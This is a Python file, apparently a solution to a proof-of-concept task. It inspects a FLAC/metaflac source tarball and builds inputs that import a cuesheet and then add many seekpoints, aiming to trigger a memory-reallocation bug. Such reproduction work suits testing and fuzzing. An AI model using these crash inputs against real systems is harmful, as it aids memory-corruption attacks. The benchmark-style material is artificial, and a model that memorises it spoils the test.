import os
import tarfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt to tailor the PoC to the repository if recognizable (best-effort)
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = tf.getnames()
                # Detect if this is a FLAC/metaflac-related repo or fuzz harness
                content_snippets = []
                for m in names:
                    low = m.lower()
                    if any(k in low for k in ("metaflac", "flac", "cuesheet", "fuzz")) and m.endswith((".c", ".cc", ".cpp", ".h", ".txt")):
                        try:
                            f = tf.extractfile(m)
                            if f:
                                data = f.read()
                                try:
                                    content_snippets.append(data.decode("utf-8", "ignore"))
                                except:
                                    pass
                        except:
                            pass
                big = "\n".join(content_snippets)
                # Look for tokens used by harness to drive operations
                has_import_long = ("import-cuesheet-from" in big) or ("--import-cuesheet-from" in big)
                has_add_seekpoint = ("add-seekpoint" in big) or ("--add-seekpoint" in big) or ("seekpoint" in big)
                # Some fuzzers use short tags like "CUESHEET" or "CUE"
                has_cue_token = ("cuesheet" in big.lower())
                # Some harnesses may use single-letter ops; try to infer
                single_letter_ops = bool(re.search(r"case\s*'C'|case\s*'S'", big))

                if has_import_long and has_add_seekpoint:
                    # CLI-ish, newline-delimited operations; inline cuesheet, then many seekpoints appended
                    cuesheet = (
                        'FILE "x" WAVE\n'
                        '  TRACK 01 AUDIO\n'
                        '    INDEX 01 00:00:00\n'
                    )
                    ops = []
                    ops.append("--import-cuesheet-from=-")
                    ops.append(cuesheet.rstrip("\n"))
                    # Append multiple seekpoints to encourage a realloc after the cuesheet op was created
                    for _ in range(12):
                        ops.append("--add-seekpoint=0")
                    payload = "\n".join(ops) + "\n"
                    return payload.encode("utf-8", "ignore")

                if has_cue_token and has_add_seekpoint:
                    # Text-mode script with explicit cue tokens
                    cuesheet = (
                        'FILE "x" WAVE\n'
                        '  TRACK 01 AUDIO\n'
                        '    INDEX 01 00:00:00\n'
                    )
                    ops = []
                    ops.append("import-cuesheet")
                    ops.append(cuesheet.rstrip("\n"))
                    for _ in range(10):
                        ops.append("add-seekpoint 0")
                    payload = "\n".join(ops) + "\n"
                    return payload.encode("utf-8", "ignore")

                if single_letter_ops:
                    # Fuzzer with single-letter operations (guess)
                    cuesheet = (
                        'FILE "x" WAVE\n'
                        '  TRACK 01 AUDIO\n'
                        '    INDEX 01 00:00:00\n'
                    )
                    ops = []
                    ops.append("C")
                    ops.append(cuesheet.rstrip("\n"))
                    for _ in range(14):
                        ops.append("S 0")
                    payload = "\n".join(ops) + "\n"
                    return payload.encode("utf-8", "ignore")

        except:
            pass

        # Fallback: a compact portfolio payload covering several likely grammars.
        # Order: import cuesheet first, then append seekpoints repeatedly.
        cuesheet = (
            'FILE "x" WAVE\n'
            '  TRACK 01 AUDIO\n'
            '    INDEX 01 00:00:00\n'
        )
        variants = []

        # Variant 1: CLI-style with equals
        v1 = []
        v1.append("--import-cuesheet-from=-")
        v1.append(cuesheet.rstrip("\n"))
        for _ in range(10):
            v1.append("--add-seekpoint=0")
        variants.append("\n".join(v1))

        # Variant 2: CLI-style without dashes
        v2 = []
        v2.append("import-cuesheet-from=-")
        v2.append(cuesheet.rstrip("\n"))
        for _ in range(8):
            v2.append("add-seekpoint=0")
        variants.append("\n".join(v2))

        # Variant 3: wordy commands
        v3 = []
        v3.append("import-cuesheet")
        v3.append(cuesheet.rstrip("\n"))
        for _ in range(8):
            v3.append("seekpoint 0")
        variants.append("\n".join(v3))

        # Variant 4: single-letter commands
        v4 = []
        v4.append("C")
        v4.append(cuesheet.rstrip("\n"))
        for _ in range(8):
            v4.append("S 0")
        variants.append("\n".join(v4))

        payload = ("\n".join(variants) + "\n").encode("utf-8", "ignore")
        return payload